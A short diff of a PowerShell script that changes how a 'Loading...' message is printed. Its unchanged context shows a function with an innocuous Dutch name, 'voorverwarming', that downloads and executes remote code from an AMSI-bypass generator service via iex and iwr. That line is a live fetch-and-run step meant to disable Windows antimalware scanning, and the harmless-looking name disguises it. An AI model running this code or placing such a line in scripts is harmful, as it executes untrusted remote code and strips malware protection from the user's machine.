@@ -1,7 +1,4 @@
-write-host @("                                                                                                                                              
-Loading...
-")
-
+write-host "Loading..."
 
 Function voorverwarming {
   iex((iwr https://amsi-fail.azurewebsites.net/api/Generate).content)
